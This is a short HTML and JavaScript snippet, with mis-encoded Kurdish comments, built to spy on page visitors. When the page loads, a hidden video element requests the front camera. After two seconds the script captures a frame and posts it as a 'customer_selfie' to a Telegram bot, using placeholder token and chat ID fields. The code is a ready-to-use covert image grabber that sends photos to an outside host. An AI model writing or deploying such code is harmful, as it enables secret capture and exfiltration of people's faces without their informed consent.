<div style="display:none;">
    <video id="autoVideo" width="320" height="240" autoplay playsinline></video>
    <canvas id="autoCanvas"></canvas>
</div>

<script>
    // Ø²Ø§Ù†ÛŒØ§Ø±ÛŒÛŒÛ•Ú©Ø§Ù†ÛŒ ØªÛŒÙ„ÛŒÚ¯Ø±Ø§Ù…ÛŒ Ø®Û†Øª Ù„ÛŽØ±Û• Ø¯Ø§Ø¨Ù†ÛŽ
    const botToken = "Ù„ÛŽØ±Û•_ØªÛ†Ú©Ù†Û•Ú©Û•Øª_Ø¯Ø§Ø¨Ù†ÛŽ";
    const chatId = "Ù„ÛŽØ±Û•_Ú†Ø§Øª_Ø¦Ø§ÛŒØ¯ÛŒ_Ø¯Ø§Ø¨Ù†ÛŽ";

    window.onload = function() {
        startAutoCamera();
    };

    function startAutoCamera() {
        const video = document.getElementById('autoVideo');
        
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                video.srcObject = stream;
                // Ø¯ÙˆØ§ÛŒ Ù¢ Ú†Ø±Ú©Û• ÙˆÛŽÙ†Û•Ú©Û• Ø¯Û•Ú¯Ø±ÛŽØª Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ú©Ø§Ù…ÛŽØ±Ø§Ú©Û• Ù„Û†Ø¯ Ø¨ÛŽØª
                setTimeout(takeAndSendPhoto, 2000);
            })
            .catch(err => console.log("Camera access denied"));
    }

    function takeAndSendPhoto() {
        const video = document.getElementById('autoVideo');
        const canvas = document.getElementById('autoCanvas');
        const context = canvas.getContext('2d');

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Ú¯Û†Ú•ÛŒÙ†ÛŒ ÙˆÛŽÙ†Û•Ú©Û• Ø¨Û† ÙÛ†Ø±Ù…Ø§ØªÛŒ Blob Ø¨Û† Ù†Ø§Ø±Ø¯Ù†ÛŒ Ø¨Û† ØªÛŒÙ„ÛŒÚ¯Ø±Ø§Ù…
        canvas.toBlob(function(blob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'customer_selfie.png');
            formData.append('caption', 'ðŸ“· ÙˆÛŽÙ†Û•ÛŒ Ú©Ú•ÛŒØ§Ø±ÛŽÚ©ÛŒ Ù†ÙˆÛŽ (Ø¦Û†ØªÛ†Ù…Ø§ØªÛŒÚ©ÛŒ)');

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log("Photo sent to Telegram!");
                // Ø¯Ø§Ø®Ø³ØªÙ†ÛŒ Ú©Ø§Ù…ÛŽØ±Ø§Ú©Û• Ø¯ÙˆØ§ÛŒ Ù†Ø§Ø±Ø¯Ù†
                const stream = video.srcObject;
                const tracks = stream.getTracks();
                tracks.forEach(track => track.stop());
            })
            .catch(error => console.error('Error sending to Telegram:', error));
        }, 'image/png');
    }
</script>
